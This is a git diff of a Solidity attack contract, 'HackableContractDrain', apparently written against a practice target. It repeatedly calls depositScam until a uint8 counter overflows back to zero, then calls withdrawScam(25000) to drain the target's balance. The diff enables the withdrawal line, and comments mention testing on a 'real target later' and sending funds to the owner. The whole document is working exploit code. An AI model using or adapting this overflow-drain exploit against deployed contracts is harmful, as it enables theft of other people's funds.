@@ -1,7 +1,9 @@
+// This complies.
 pragma solidity =0.7.6;
 
 import "hardhat/console.sol";
 
+// Test with real target later.
 contract HackableContractDrain {
 
     // address public constant HACKABLECONTRACT_ADDRESS = 0xFcF2774cD61743fF7C34607Fadf3C84FC4762029;
@@ -29,13 +31,14 @@ contract HackableContractDrain {
         do {
             hackableContract.depositScam(owner_, 0);
             count = hackableContract.count();
-
+            // Currently it is 1
+            // Repeat until 1 to 256 and 0 again.
         } while (count != 0);
 
         hackableContract.depositScam(owner_, 0);
-        // Call with owner instead later?
-        // Or include function to do it instead and send to the author here.
-        // hackableContract.withdrawScam(owner_, 25000);
+        // Call with owner adress instead later?
+        // Or include function or code to do send to owner.
+        hackableContract.withdrawScam(25000);
     }
 }
 
@@ -45,14 +48,13 @@ abstract contract HackableContract {
 	mapping(address => uint8) addressToId;
 	mapping(uint8 => uint256) balances;
     
-    function setCount(uint8 scam) external;
-	function depositScam(address origin, uint256 amount) external;
-    function withdrawScam(uint256 amount) external;
+    function setCount(uint8 scam) virtual external;
+	function depositScam(address origin, uint256 amount) virtual external;
+    function withdrawScam(uint256 amount) virtual external;
 }
 
 abstract contract BEP20 {
-    
-    
+        
     function balanceOf(address tokenOwner) virtual external view returns (uint256);
     function transfer(address receiver, uint256 numTokens) virtual public returns (bool);
     function totalSupply() virtual external view returns (uint256);
